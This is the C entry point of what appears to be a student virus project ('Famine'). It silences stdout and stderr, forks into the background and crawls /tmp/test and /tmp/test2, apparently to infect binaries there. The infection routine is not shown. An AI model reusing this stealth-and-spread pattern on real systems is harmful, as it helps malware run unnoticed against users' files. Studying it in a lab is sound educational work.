/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/13 18:01:45 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#include <fcntl.h>
#include <unistd.h>

int	mute_outputs()
{
	int	fd = open("/dev/null", O_RDONLY);
	if (fd == -1)
		return (-1);
	
	if (dup2(fd, STDOUT_FILENO) == -1
		|| dup2(fd, STDERR_FILENO) == -1)
	{
		close(fd);
		return (-1);
	}

	close(fd);
	return (0);
}

int	main(void)
{
	if (mute_outputs() == -1)
		return (0);

	int	pid = fork();
	if (pid == -1 || pid != 0)
		return (0);

	crawl_dir("/tmp/test");
	crawl_dir("/tmp/test2");

	// execute infected binary if there is one
	return (0);
}
